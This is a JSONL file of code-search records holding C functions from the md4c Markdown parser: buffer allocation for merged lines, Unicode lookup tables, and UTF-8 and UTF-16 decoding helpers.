{"docstring": "/* Wrapper of md_merge_lines() which allocates new buffer for the output string.\n */\n", "func_signal": "static int\nmd_merge_lines_alloc(MD_CTX* ctx, OFF beg, OFF end, const MD_LINE* lines, int n_lines,\n                    CHAR line_break_replacement_char, CHAR** p_str, SZ* p_size)", "code": "{\n    CHAR* buffer;\n\n    buffer = (CHAR*) malloc(sizeof(CHAR) * (end - beg));\n    if(buffer == NULL) {\n        MD_LOG(\"malloc() failed.\");\n        return -1;\n    }\n\n    md_merge_lines(ctx, beg, end, lines, n_lines,\n                line_break_replacement_char, buffer, p_size);\n\n    *p_str = buffer;\n    return 0;\n}", "path": "tools\\specgen\\md4c.c", "repo_name": "playbit/playsys", "stars": 275, "license": "apache-2.0", "language": "c", "size": 308}
{"docstring": "/* Binary search over sorted \"map\" of codepoints. Consecutive sequences\n     * of codepoints may be encoded in the map by just using the\n     * (MIN_CODEPOINT | 0x40000000) and (MAX_CODEPOINT | 0x80000000).\n     *\n     * Returns index of the found record in the map (in the case of ranges,\n     * the minimal value is used); or -1 on failure. */\n", "func_signal": "static int\n    md_unicode_bsearch__(unsigned codepoint, const unsigned* map, size_t map_size)", "code": "{\n        int beg, end;\n        int pivot_beg, pivot_end;\n\n        beg = 0;\n        end = (int) map_size-1;\n        while(beg <= end) {\n            /* Pivot may be a range, not just a single value. */\n            pivot_beg = pivot_end = (beg + end) / 2;\n            if(map[pivot_end] & 0x40000000)\n                pivot_end++;\n            if(map[pivot_beg] & 0x80000000)\n                pivot_beg--;\n\n            if(codepoint < (map[pivot_beg] & 0x00ffffff))\n                end = pivot_beg - 1;\n            else if(codepoint > (map[pivot_end] & 0x00ffffff))\n                beg = pivot_end + 1;\n            else\n                return pivot_beg;\n        }\n\n        return -1;\n    }\n\n    static int\n    md_is_unicode_whitespace__(unsigned codepoint)\n    {\n#define R(cp_min, cp_max)   ((cp_min) | 0x40000000), ((cp_max) | 0x80000000)\n#define S(cp)               (cp)\n        /* Unicode \"Zs\" category.\n         * (generated by scripts/build_whitespace_map.py) */\n        static const unsigned WHITESPACE_MAP[] = {\n            S(0x0020), S(0x00a0), S(0x1680), R(0x2000,0x200a), S(0x202f), S(0x205f), S(0x3000)\n        };\n#undef R\n#undef S\n\n        /* The ASCII ones are the most frequently used ones, also CommonMark\n         * specification requests few more in this range. */\n        if(codepoint <= 0x7f)\n            return ISWHITESPACE_(codepoint);\n\n        return (md_unicode_bsearch__(codepoint, WHITESPACE_MAP, SIZEOF_ARRAY(WHITESPACE_MAP)) >= 0);\n    }\n\n    static int\n    md_is_unicode_punct__(unsigned codepoint)\n    {\n#define R(cp_min, cp_max)   ((cp_min) | 0x40000000), ((cp_max) | 0x80000000)\n#define S(cp)               (cp)\n        /* Unicode \"Pc\", \"Pd\", \"Pe\", \"Pf\", \"Pi\", \"Po\", \"Ps\" categories.\n         * (generated by scripts/build_punct_map.py) */\n        static const unsigned PUNCT_MAP[] = {\n            R(0x0021,0x0023), R(0x0025,0x002a), R(0x002c,0x002f), R(0x003a,0x003b), R(0x003f,0x0040),\n            R(0x005b,0x005d), S(0x005f), S(0x007b), S(0x007d), S(0x00a1), S(0x00a7), S(0x00ab), R(0x00b6,0x00b7),\n            S(0x00bb), S(0x00bf), S(0x037e), S(0x0387), R(0x055a,0x055f), R(0x0589,0x058a), S(0x05be), S(0x05c0),\n            S(0x05c3), S(0x05c6), R(0x05f3,0x05f4), R(0x0609,0x060a), R(0x060c,0x060d), S(0x061b), R(0x061e,0x061f),\n            R(0x066a,0x066d), S(0x06d4), R(0x0700,0x070d), R(0x07f7,0x07f9), R(0x0830,0x083e), S(0x085e),\n            R(0x0964,0x0965), S(0x0970), S(0x09fd), S(0x0a76), S(0x0af0), S(0x0c77), S(0x0c84), S(0x0df4), S(0x0e4f),\n            R(0x0e5a,0x0e5b), R(0x0f04,0x0f12), S(0x0f14), R(0x0f3a,0x0f3d), S(0x0f85), R(0x0fd0,0x0fd4),\n            R(0x0fd9,0x0fda), R(0x104a,0x104f), S(0x10fb), R(0x1360,0x1368), S(0x1400), S(0x166e), R(0x169b,0x169c),\n            R(0x16eb,0x16ed), R(0x1735,0x1736), R(0x17d4,0x17d6), R(0x17d8,0x17da), R(0x1800,0x180a),\n            R(0x1944,0x1945), R(0x1a1e,0x1a1f), R(0x1aa0,0x1aa6), R(0x1aa8,0x1aad), R(0x1b5a,0x1b60),\n            R(0x1bfc,0x1bff), R(0x1c3b,0x1c3f), R(0x1c7e,0x1c7f), R(0x1cc0,0x1cc7), S(0x1cd3), R(0x2010,0x2027),\n            R(0x2030,0x2043), R(0x2045,0x2051), R(0x2053,0x205e), R(0x207d,0x207e), R(0x208d,0x208e),\n            R(0x2308,0x230b), R(0x2329,0x232a), R(0x2768,0x2775), R(0x27c5,0x27c6), R(0x27e6,0x27ef),\n            R(0x2983,0x2998), R(0x29d8,0x29db), R(0x29fc,0x29fd), R(0x2cf9,0x2cfc), R(0x2cfe,0x2cff), S(0x2d70),\n            R(0x2e00,0x2e2e), R(0x2e30,0x2e4f), S(0x2e52), R(0x3001,0x3003), R(0x3008,0x3011), R(0x3014,0x301f),\n            S(0x3030), S(0x303d), S(0x30a0), S(0x30fb), R(0xa4fe,0xa4ff), R(0xa60d,0xa60f), S(0xa673), S(0xa67e),\n            R(0xa6f2,0xa6f7), R(0xa874,0xa877), R(0xa8ce,0xa8cf), R(0xa8f8,0xa8fa), S(0xa8fc), R(0xa92e,0xa92f),\n            S(0xa95f), R(0xa9c1,0xa9cd), R(0xa9de,0xa9df), R(0xaa5c,0xaa5f), R(0xaade,0xaadf), R(0xaaf0,0xaaf1),\n            S(0xabeb), R(0xfd3e,0xfd3f), R(0xfe10,0xfe19), R(0xfe30,0xfe52), R(0xfe54,0xfe61), S(0xfe63), S(0xfe68),\n            R(0xfe6a,0xfe6b), R(0xff01,0xff03), R(0xff05,0xff0a), R(0xff0c,0xff0f), R(0xff1a,0xff1b),\n            R(0xff1f,0xff20), R(0xff3b,0xff3d), S(0xff3f), S(0xff5b), S(0xff5d), R(0xff5f,0xff65), R(0x10100,0x10102),\n            S(0x1039f), S(0x103d0), S(0x1056f), S(0x10857), S(0x1091f), S(0x1093f), R(0x10a50,0x10a58), S(0x10a7f),\n            R(0x10af0,0x10af6), R(0x10b39,0x10b3f), R(0x10b99,0x10b9c), S(0x10ead), R(0x10f55,0x10f59),\n            R(0x11047,0x1104d), R(0x110bb,0x110bc), R(0x110be,0x110c1), R(0x11140,0x11143), R(0x11174,0x11175),\n            R(0x111c5,0x111c8), S(0x111cd), S(0x111db), R(0x111dd,0x111df), R(0x11238,0x1123d), S(0x112a9),\n            R(0x1144b,0x1144f), R(0x1145a,0x1145b), S(0x1145d), S(0x114c6), R(0x115c1,0x115d7), R(0x11641,0x11643),\n            R(0x11660,0x1166c), R(0x1173c,0x1173e), S(0x1183b), R(0x11944,0x11946), S(0x119e2), R(0x11a3f,0x11a46),\n            R(0x11a9a,0x11a9c), R(0x11a9e,0x11aa2), R(0x11c41,0x11c45), R(0x11c70,0x11c71), R(0x11ef7,0x11ef8),\n            S(0x11fff), R(0x12470,0x12474), R(0x16a6e,0x16a6f), S(0x16af5), R(0x16b37,0x16b3b), S(0x16b44),\n            R(0x16e97,0x16e9a), S(0x16fe2), S(0x1bc9f), R(0x1da87,0x1da8b), R(0x1e95e,0x1e95f)\n        };\n#undef R\n#undef S\n\n        /* The ASCII ones are the most frequently used ones, also CommonMark\n         * specification requests few more in this range. */\n        if(codepoint <= 0x7f)\n            return ISPUNCT_(codepoint);\n\n        return (md_unicode_bsearch__(codepoint, PUNCT_MAP, SIZEOF_ARRAY(PUNCT_MAP)) >= 0);\n    }\n\n    static void\n    md_get_unicode_fold_info(unsigned codepoint, MD_UNICODE_FOLD_INFO* info)\n    {\n#define R(cp_min, cp_max)   ((cp_min) | 0x40000000), ((cp_max) | 0x80000000)\n#define S(cp)               (cp)\n        /* Unicode \"Pc\", \"Pd\", \"Pe\", \"Pf\", \"Pi\", \"Po\", \"Ps\" categories.\n         * (generated by scripts/build_folding_map.py) */\n        static const unsigned FOLD_MAP_1[] = {\n            R(0x0041,0x005a), S(0x00b5), R(0x00c0,0x00d6), R(0x00d8,0x00de), R(0x0100,0x012e), R(0x0132,0x0136),\n            R(0x0139,0x0147), R(0x014a,0x0176), S(0x0178), R(0x0179,0x017d), S(0x017f), S(0x0181), S(0x0182),\n            S(0x0184), S(0x0186), S(0x0187), S(0x0189), S(0x018a), S(0x018b), S(0x018e), S(0x018f), S(0x0190),\n            S(0x0191), S(0x0193), S(0x0194), S(0x0196), S(0x0197), S(0x0198), S(0x019c), S(0x019d), S(0x019f),\n            R(0x01a0,0x01a4), S(0x01a6), S(0x01a7), S(0x01a9), S(0x01ac), S(0x01ae), S(0x01af), S(0x01b1), S(0x01b2),\n            S(0x01b3), S(0x01b5), S(0x01b7), S(0x01b8), S(0x01bc), S(0x01c4), S(0x01c5), S(0x01c7), S(0x01c8),\n            S(0x01ca), R(0x01cb,0x01db), R(0x01de,0x01ee), S(0x01f1), S(0x01f2), S(0x01f4), S(0x01f6), S(0x01f7),\n            R(0x01f8,0x021e), S(0x0220), R(0x0222,0x0232), S(0x023a), S(0x023b), S(0x023d), S(0x023e), S(0x0241),\n            S(0x0243), S(0x0244), S(0x0245), R(0x0246,0x024e), S(0x0345), S(0x0370), S(0x0372), S(0x0376), S(0x037f),\n            S(0x0386), R(0x0388,0x038a), S(0x038c), S(0x038e), S(0x038f), R(0x0391,0x03a1), R(0x03a3,0x03ab),\n            S(0x03c2), S(0x03cf), S(0x03d0), S(0x03d1), S(0x03d5), S(0x03d6), R(0x03d8,0x03ee), S(0x03f0), S(0x03f1),\n            S(0x03f4), S(0x03f5), S(0x03f7), S(0x03f9), S(0x03fa), R(0x03fd,0x03ff), R(0x0400,0x040f),\n            R(0x0410,0x042f), R(0x0460,0x0480), R(0x048a,0x04be), S(0x04c0), R(0x04c1,0x04cd), R(0x04d0,0x052e),\n            R(0x0531,0x0556), R(0x10a0,0x10c5), S(0x10c7), S(0x10cd), R(0x13f8,0x13fd), S(0x1c80), S(0x1c81),\n            S(0x1c82), S(0x1c83), S(0x1c84), S(0x1c85), S(0x1c86), S(0x1c87), S(0x1c88), R(0x1c90,0x1cba),\n            R(0x1cbd,0x1cbf), R(0x1e00,0x1e94), S(0x1e9b), R(0x1ea0,0x1efe), R(0x1f08,0x1f0f), R(0x1f18,0x1f1d),\n            R(0x1f28,0x1f2f), R(0x1f38,0x1f3f), R(0x1f48,0x1f4d), S(0x1f59), S(0x1f5b), S(0x1f5d), S(0x1f5f),\n            R(0x1f68,0x1f6f), S(0x1fb8), S(0x1fb9), S(0x1fba), S(0x1fbb), S(0x1fbe), R(0x1fc8,0x1fcb), S(0x1fd8),\n            S(0x1fd9), S(0x1fda), S(0x1fdb), S(0x1fe8), S(0x1fe9), S(0x1fea), S(0x1feb), S(0x1fec), S(0x1ff8),\n            S(0x1ff9), S(0x1ffa), S(0x1ffb), S(0x2126), S(0x212a), S(0x212b), S(0x2132), R(0x2160,0x216f), S(0x2183),\n            R(0x24b6,0x24cf), R(0x2c00,0x2c2e), S(0x2c60), S(0x2c62), S(0x2c63), S(0x2c64), R(0x2c67,0x2c6b),\n            S(0x2c6d), S(0x2c6e), S(0x2c6f), S(0x2c70), S(0x2c72), S(0x2c75), S(0x2c7e), S(0x2c7f), R(0x2c80,0x2ce2),\n            S(0x2ceb), S(0x2ced), S(0x2cf2), R(0xa640,0xa66c), R(0xa680,0xa69a), R(0xa722,0xa72e), R(0xa732,0xa76e),\n            S(0xa779), S(0xa77b), S(0xa77d), R(0xa77e,0xa786), S(0xa78b), S(0xa78d), S(0xa790), S(0xa792),\n            R(0xa796,0xa7a8), S(0xa7aa), S(0xa7ab), S(0xa7ac), S(0xa7ad), S(0xa7ae), S(0xa7b0), S(0xa7b1), S(0xa7b2),\n            S(0xa7b3), R(0xa7b4,0xa7be), S(0xa7c2), S(0xa7c4), S(0xa7c5), S(0xa7c6), S(0xa7c7), S(0xa7c9), S(0xa7f5),\n            R(0xab70,0xabbf), R(0xff21,0xff3a), R(0x10400,0x10427), R(0x104b0,0x104d3), R(0x10c80,0x10cb2),\n            R(0x118a0,0x118bf), R(0x16e40,0x16e5f), R(0x1e900,0x1e921)\n        };\n        static const unsigned FOLD_MAP_1_DATA[] = {\n            0x0061, 0x007a, 0x03bc, 0x00e0, 0x00f6, 0x00f8, 0x00fe, 0x0101, 0x012f, 0x0133, 0x0137, 0x013a, 0x0148,\n            0x014b, 0x0177, 0x00ff, 0x017a, 0x017e, 0x0073, 0x0253, 0x0183, 0x0185, 0x0254, 0x0188, 0x0256, 0x0257,\n            0x018c, 0x01dd, 0x0259, 0x025b, 0x0192, 0x0260, 0x0263, 0x0269, 0x0268, 0x0199, 0x026f, 0x0272, 0x0275,\n            0x01a1, 0x01a5, 0x0280, 0x01a8, 0x0283, 0x01ad, 0x0288, 0x01b0, 0x028a, 0x028b, 0x01b4, 0x01b6, 0x0292,\n            0x01b9, 0x01bd, 0x01c6, 0x01c6, 0x01c9, 0x01c9, 0x01cc, 0x01cc, 0x01dc, 0x01df, 0x01ef, 0x01f3, 0x01f3,\n            0x01f5, 0x0195, 0x01bf, 0x01f9, 0x021f, 0x019e, 0x0223, 0x0233, 0x2c65, 0x023c, 0x019a, 0x2c66, 0x0242,\n            0x0180, 0x0289, 0x028c, 0x0247, 0x024f, 0x03b9, 0x0371, 0x0373, 0x0377, 0x03f3, 0x03ac, 0x03ad, 0x03af,\n            0x03cc, 0x03cd, 0x03ce, 0x03b1, 0x03c1, 0x03c3, 0x03cb, 0x03c3, 0x03d7, 0x03b2, 0x03b8, 0x03c6, 0x03c0,\n            0x03d9, 0x03ef, 0x03ba, 0x03c1, 0x03b8, 0x03b5, 0x03f8, 0x03f2, 0x03fb, 0x037b, 0x037d, 0x0450, 0x045f,\n            0x0430, 0x044f, 0x0461, 0x0481, 0x048b, 0x04bf, 0x04cf, 0x04c2, 0x04ce, 0x04d1, 0x052f, 0x0561, 0x0586,\n            0x2d00, 0x2d25, 0x2d27, 0x2d2d, 0x13f0, 0x13f5, 0x0432, 0x0434, 0x043e, 0x0441, 0x0442, 0x0442, 0x044a,\n            0x0463, 0xa64b, 0x10d0, 0x10fa, 0x10fd, 0x10ff, 0x1e01, 0x1e95, 0x1e61, 0x1ea1, 0x1eff, 0x1f00, 0x1f07,\n            0x1f10, 0x1f15, 0x1f20, 0x1f27, 0x1f30, 0x1f37, 0x1f40, 0x1f45, 0x1f51, 0x1f53, 0x1f55, 0x1f57, 0x1f60,\n            0x1f67, 0x1fb0, 0x1fb1, 0x1f70, 0x1f71, 0x03b9, 0x1f72, 0x1f75, 0x1fd0, 0x1fd1, 0x1f76, 0x1f77, 0x1fe0,\n            0x1fe1, 0x1f7a, 0x1f7b, 0x1fe5, 0x1f78, 0x1f79, 0x1f7c, 0x1f7d, 0x03c9, 0x006b, 0x00e5, 0x214e, 0x2170,\n            0x217f, 0x2184, 0x24d0, 0x24e9, 0x2c30, 0x2c5e, 0x2c61, 0x026b, 0x1d7d, 0x027d, 0x2c68, 0x2c6c, 0x0251,\n            0x0271, 0x0250, 0x0252, 0x2c73, 0x2c76, 0x023f, 0x0240, 0x2c81, 0x2ce3, 0x2cec, 0x2cee, 0x2cf3, 0xa641,\n            0xa66d, 0xa681, 0xa69b, 0xa723, 0xa72f, 0xa733, 0xa76f, 0xa77a, 0xa77c, 0x1d79, 0xa77f, 0xa787, 0xa78c,\n            0x0265, 0xa791, 0xa793, 0xa797, 0xa7a9, 0x0266, 0x025c, 0x0261, 0x026c, 0x026a, 0x029e, 0x0287, 0x029d,\n            0xab53, 0xa7b5, 0xa7bf, 0xa7c3, 0xa794, 0x0282, 0x1d8e, 0xa7c8, 0xa7ca, 0xa7f6, 0x13a0, 0x13ef, 0xff41,\n            0xff5a, 0x10428, 0x1044f, 0x104d8, 0x104fb, 0x10cc0, 0x10cf2, 0x118c0, 0x118df, 0x16e60, 0x16e7f, 0x1e922,\n            0x1e943\n        };\n        static const unsigned FOLD_MAP_2[] = {\n            S(0x00df), S(0x0130), S(0x0149), S(0x01f0), S(0x0587), S(0x1e96), S(0x1e97), S(0x1e98), S(0x1e99),\n            S(0x1e9a), S(0x1e9e), S(0x1f50), R(0x1f80,0x1f87), R(0x1f88,0x1f8f), R(0x1f90,0x1f97), R(0x1f98,0x1f9f),\n            R(0x1fa0,0x1fa7), R(0x1fa8,0x1faf), S(0x1fb2), S(0x1fb3), S(0x1fb4), S(0x1fb6), S(0x1fbc), S(0x1fc2),\n            S(0x1fc3), S(0x1fc4), S(0x1fc6), S(0x1fcc), S(0x1fd6), S(0x1fe4), S(0x1fe6), S(0x1ff2), S(0x1ff3),\n            S(0x1ff4), S(0x1ff6), S(0x1ffc), S(0xfb00), S(0xfb01), S(0xfb02), S(0xfb05), S(0xfb06), S(0xfb13),\n            S(0xfb14), S(0xfb15), S(0xfb16), S(0xfb17)\n        };\n        static const unsigned FOLD_MAP_2_DATA[] = {\n            0x0073,0x0073, 0x0069,0x0307, 0x02bc,0x006e, 0x006a,0x030c, 0x0565,0x0582, 0x0068,0x0331, 0x0074,0x0308,\n            0x0077,0x030a, 0x0079,0x030a, 0x0061,0x02be, 0x0073,0x0073, 0x03c5,0x0313, 0x1f00,0x03b9, 0x1f07,0x03b9,\n            0x1f00,0x03b9, 0x1f07,0x03b9, 0x1f20,0x03b9, 0x1f27,0x03b9, 0x1f20,0x03b9, 0x1f27,0x03b9, 0x1f60,0x03b9,\n            0x1f67,0x03b9, 0x1f60,0x03b9, 0x1f67,0x03b9, 0x1f70,0x03b9, 0x03b1,0x03b9, 0x03ac,0x03b9, 0x03b1,0x0342,\n            0x03b1,0x03b9, 0x1f74,0x03b9, 0x03b7,0x03b9, 0x03ae,0x03b9, 0x03b7,0x0342, 0x03b7,0x03b9, 0x03b9,0x0342,\n            0x03c1,0x0313, 0x03c5,0x0342, 0x1f7c,0x03b9, 0x03c9,0x03b9, 0x03ce,0x03b9, 0x03c9,0x0342, 0x03c9,0x03b9,\n            0x0066,0x0066, 0x0066,0x0069, 0x0066,0x006c, 0x0073,0x0074, 0x0073,0x0074, 0x0574,0x0576, 0x0574,0x0565,\n            0x0574,0x056b, 0x057e,0x0576, 0x0574,0x056d\n        };\n        static const unsigned FOLD_MAP_3[] = {\n            S(0x0390), S(0x03b0), S(0x1f52), S(0x1f54), S(0x1f56), S(0x1fb7), S(0x1fc7), S(0x1fd2), S(0x1fd3),\n            S(0x1fd7), S(0x1fe2), S(0x1fe3), S(0x1fe7), S(0x1ff7), S(0xfb03), S(0xfb04)\n        };\n        static const unsigned FOLD_MAP_3_DATA[] = {\n            0x03b9,0x0308,0x0301, 0x03c5,0x0308,0x0301, 0x03c5,0x0313,0x0300, 0x03c5,0x0313,0x0301,\n            0x03c5,0x0313,0x0342, 0x03b1,0x0342,0x03b9, 0x03b7,0x0342,0x03b9, 0x03b9,0x0308,0x0300,\n            0x03b9,0x0308,0x0301, 0x03b9,0x0308,0x0342, 0x03c5,0x0308,0x0300, 0x03c5,0x0308,0x0301,\n            0x03c5,0x0308,0x0342, 0x03c9,0x0342,0x03b9, 0x0066,0x0066,0x0069, 0x0066,0x0066,0x006c\n        };\n#undef R\n#undef S\n        static const struct {\n            const unsigned* map;\n            const unsigned* data;\n            size_t map_size;\n            unsigned n_codepoints;\n        } FOLD_MAP_LIST[] = {\n            { FOLD_MAP_1, FOLD_MAP_1_DATA, SIZEOF_ARRAY(FOLD_MAP_1), 1 },\n            { FOLD_MAP_2, FOLD_MAP_2_DATA, SIZEOF_ARRAY(FOLD_MAP_2), 2 },\n            { FOLD_MAP_3, FOLD_MAP_3_DATA, SIZEOF_ARRAY(FOLD_MAP_3), 3 }\n        };\n\n        int i;\n\n        /* Fast path for ASCII characters. */\n        if(codepoint <= 0x7f) {\n            info->codepoints[0] = codepoint;\n            if(ISUPPER_(codepoint))\n                info->codepoints[0] += 'a' - 'A';\n            info->n_codepoints = 1;\n            return;\n        }\n\n        /* Try to locate the codepoint in any of the maps. */\n        for(i = 0; i < (int) SIZEOF_ARRAY(FOLD_MAP_LIST); i++) {\n            int index;\n\n            index = md_unicode_bsearch__(codepoint, FOLD_MAP_LIST[i].map, FOLD_MAP_LIST[i].map_size);\n            if(index >= 0) {\n                /* Found the mapping. */\n                unsigned n_codepoints = FOLD_MAP_LIST[i].n_codepoints;\n                const unsigned* map = FOLD_MAP_LIST[i].map;\n                const unsigned* codepoints = FOLD_MAP_LIST[i].data + (index * n_codepoints);\n\n                memcpy(info->codepoints, codepoints, sizeof(unsigned) * n_codepoints);\n                info->n_codepoints = n_codepoints;\n\n                if(FOLD_MAP_LIST[i].map[index] != codepoint) {\n                    /* The found mapping maps whole range of codepoints,\n                     * i.e. we have to offset info->codepoints[0] accordingly. */\n                    if((map[index] & 0x00ffffff)+1 == codepoints[0]) {\n                        /* Alternating type of the range. */\n                        info->codepoints[0] = codepoint + ((codepoint & 0x1) == (map[index] & 0x1) ? 1 : 0);\n                    } else {\n                        /* Range to range kind of mapping. */\n                        info->codepoints[0] += (codepoint - (map[index] & 0x00ffffff));\n                    }\n                }\n\n                return;\n            }\n        }\n\n        /* No mapping found. Map the codepoint to itself. */\n        info->codepoints[0] = codepoint;\n        info->n_codepoints = 1;\n    }\n#endif\n\n\n#if defined MD4C_USE_UTF16\n    #define IS_UTF16_SURROGATE_HI(word)     (((WORD)(word) & 0xfc00) == 0xd800)\n    #define IS_UTF16_SURROGATE_LO(word)     (((WORD)(word) & 0xfc00) == 0xdc00)\n    #define UTF16_DECODE_SURROGATE(hi, lo)  (0x10000 + ((((unsigned)(hi) & 0x3ff) << 10) | (((unsigned)(lo) & 0x3ff) << 0)))\n\n    static unsigned\n    md_decode_utf16le__(const CHAR* str, SZ str_size, SZ* p_size)\n    {\n        if(IS_UTF16_SURROGATE_HI(str[0])) {\n            if(1 < str_size && IS_UTF16_SURROGATE_LO(str[1])) {\n                if(p_size != NULL)\n                    *p_size = 2;\n                return UTF16_DECODE_SURROGATE(str[0], str[1]);\n            }\n        }\n\n        if(p_size != NULL)\n            *p_size = 1;\n        return str[0];\n    }\n\n    static unsigned\n    md_decode_utf16le_before__(MD_CTX* ctx, OFF off)\n    {\n        if(off > 2 && IS_UTF16_SURROGATE_HI(CH(off-2)) && IS_UTF16_SURROGATE_LO(CH(off-1)))\n            return UTF16_DECODE_SURROGATE(CH(off-2), CH(off-1));\n\n        return CH(off);\n    }\n\n    /* No whitespace uses surrogates, so no decoding needed here. */\n    #define ISUNICODEWHITESPACE_(codepoint) md_is_unicode_whitespace__(codepoint)\n    #define ISUNICODEWHITESPACE(off)        md_is_unicode_whitespace__(CH(off))\n    #define ISUNICODEWHITESPACEBEFORE(off)  md_is_unicode_whitespace__(CH((off)-1))\n\n    #define ISUNICODEPUNCT(off)             md_is_unicode_punct__(md_decode_utf16le__(STR(off), ctx->size - (off), NULL))\n    #define ISUNICODEPUNCTBEFORE(off)       md_is_unicode_punct__(md_decode_utf16le_before__(ctx, off))\n\n    static inline int\n    md_decode_unicode(const CHAR* str, OFF off, SZ str_size, SZ* p_char_size)\n    {\n        return md_decode_utf16le__(str+off, str_size-off, p_char_size);\n    }\n#elif defined MD4C_USE_UTF8\n    #define IS_UTF8_LEAD1(byte)     ((unsigned char)(byte) <= 0x7f)\n    #define IS_UTF8_LEAD2(byte)     (((unsigned char)(byte) & 0xe0) == 0xc0)\n    #define IS_UTF8_LEAD3(byte)     (((unsigned char)(byte) & 0xf0) == 0xe0)\n    #define IS_UTF8_LEAD4(byte)     (((unsigned char)(byte) & 0xf8) == 0xf0)\n    #define IS_UTF8_TAIL(byte)      (((unsigned char)(byte) & 0xc0) == 0x80)\n\n    static unsigned\n    md_decode_utf8__(const CHAR* str, SZ str_size, SZ* p_size)\n    {\n        if(!IS_UTF8_LEAD1(str[0])) {\n            if(IS_UTF8_LEAD2(str[0])) {\n                if(1 < str_size && IS_UTF8_TAIL(str[1])) {\n                    if(p_size != NULL)\n                        *p_size = 2;\n\n                    return (((unsigned int)str[0] & 0x1f) << 6) |\n                           (((unsigned int)str[1] & 0x3f) << 0);\n                }\n            } else if(IS_UTF8_LEAD3(str[0])) {\n                if(2 < str_size && IS_UTF8_TAIL(str[1]) && IS_UTF8_TAIL(str[2])) {\n                    if(p_size != NULL)\n                        *p_size = 3;\n\n                    return (((unsigned int)str[0] & 0x0f) << 12) |\n                           (((unsigned int)str[1] & 0x3f) << 6) |\n                           (((unsigned int)str[2] & 0x3f) << 0);\n                }\n            } else if(IS_UTF8_LEAD4(str[0])) {\n                if(3 < str_size && IS_UTF8_TAIL(str[1]) && IS_UTF8_TAIL(str[2]) && IS_UTF8_TAIL(str[3])) {\n                    if(p_size != NULL)\n                        *p_size = 4;\n\n                    return (((unsigned int)str[0] & 0x07) << 18) |\n                           (((unsigned int)str[1] & 0x3f) << 12) |\n                           (((unsigned int)str[2] & 0x3f) << 6) |\n                           (((unsigned int)str[3] & 0x3f) << 0);\n                }\n            }\n        }\n\n        if(p_size != NULL)\n            *p_size = 1;\n        return (unsigned) str[0];\n    }\n\n    static unsigned\n    md_decode_utf8_before__(MD_CTX* ctx, OFF off)\n    {\n        if(!IS_UTF8_LEAD1(CH(off-1))) {\n            if(off > 1 && IS_UTF8_LEAD2(CH(off-2)) && IS_UTF8_TAIL(CH(off-1)))\n                return (((unsigned int)CH(off-2) & 0x1f) << 6) |\n                       (((unsigned int)CH(off-1) & 0x3f) << 0);\n\n            if(off > 2 && IS_UTF8_LEAD3(CH(off-3)) && IS_UTF8_TAIL(CH(off-2)) && IS_UTF8_TAIL(CH(off-1)))\n                return (((unsigned int)CH(off-3) & 0x0f) << 12) |\n                       (((unsigned int)CH(off-2) & 0x3f) << 6) |\n                       (((unsigned int)CH(off-1) & 0x3f) << 0);\n\n            if(off > 3 && IS_UTF8_LEAD4(CH(off-4)) && IS_UTF8_TAIL(CH(off-3)) && IS_UTF8_TAIL(CH(off-2)) && IS_UTF8_TAIL(CH(off-1)))\n                return (((unsigned int)CH(off-4) & 0x07) << 18) |\n                       (((unsigned int)CH(off-3) & 0x3f) << 12) |\n                       (((unsigned int)CH(off-2) & 0x3f) << 6) |\n                       (((unsigned int)CH(off-1) & 0x3f) << 0);\n        }\n\n        return (unsigned) CH(off-1);\n    }\n\n    #define ISUNICODEWHITESPACE_(codepoint) md_is_unicode_whitespace__(codepoint)\n    #define ISUNICODEWHITESPACE(off)        md_is_unicode_whitespace__(md_decode_utf8__(STR(off), ctx->size - (off), NULL))\n    #define ISUNICODEWHITESPACEBEFORE(off)  md_is_unicode_whitespace__(md_decode_utf8_before__(ctx, off))\n\n    #define ISUNICODEPUNCT(off)             md_is_unicode_punct__(md_decode_utf8__(STR(off), ctx->size - (off), NULL))\n    #define ISUNICODEPUNCTBEFORE(off)       md_is_unicode_punct__(md_decode_utf8_before__(ctx, off))\n\n    static inline unsigned\n    md_decode_unicode(const CHAR* str, OFF off, SZ str_size, SZ* p_char_size)\n    {\n        return md_decode_utf8__(str+off, str_size-off, p_char_size);\n    }\n#else\n    #define ISUNICODEWHITESPACE_(codepoint) ISWHITESPACE_(codepoint)\n    #define ISUNICODEWHITESPACE(off)        ISWHITESPACE(off)\n    #define ISUNICODEWHITESPACEBEFORE(off)  ISWHITESPACE((off)-1)\n\n    #define ISUNICODEPUNCT(off)             ISPUNCT(off)\n    #define ISUNICODEPUNCTBEFORE(off)       ISPUNCT((off)-1)\n\n    static inline void\n    md_get_unicode_fold_info(unsigned codepoint, MD_UNICODE_FOLD_INFO* info)\n    {\n        info->codepoints[0] = codepoint;\n        if(ISUPPER_(codepoint))\n            info->codepoints[0] += 'a' - 'A';\n        info->n_codepoints = 1;\n    }\n\n    static inline unsigned\n    md_decode_unicode(const CHAR* str, OFF off, SZ str_size, SZ* p_size)\n    {\n        *p_size = 1;\n        return (unsigned) str[off];\n    }\n#endif\n\n\n/*************************************\n ***  Helper string manipulations  ***\n *************************************/\n\n/* Fill buffer with copy of the string between 'beg' and 'end' but replace any\n * line breaks with given replacement character.\n *\n * NOTE: Caller is responsible to make sure the buffer is large enough.\n * (Given the output is always shorter then input, (end - beg) is good idea\n * what the caller should allocate.)\n */\nstatic void\nmd_merge_lines(MD_CTX* ctx, OFF beg, OFF end, const MD_LINE* lines, int n_lines,\n               CHAR line_break_replacement_char, CHAR* buffer, SZ* p_size)\n{\n    CHAR* ptr = buffer;\n    int line_index = 0;\n    OFF off = beg;\n\n    MD_UNUSED(n_lines);\n\n    while(1) {\n        const MD_LINE* line = &lines[line_index];\n        OFF line_end = line->end;\n        if(end < line_end)\n            line_end = end;\n\n        while(off < line_end) {\n            *ptr = CH(off);\n            ptr++;\n            off++;\n        }\n\n        if(off >= end) {\n            *p_size = ptr - buffer;\n            return;\n        }\n\n        *ptr = line_break_replacement_char;\n        ptr++;\n\n        line_index++;\n        off = lines[line_index].beg;\n    }\n}", "path": "tools\\specgen\\md4c.c", "repo_name": "playbit/playsys", "stars": 275, "license": "apache-2.0", "language": "c", "size": 308}
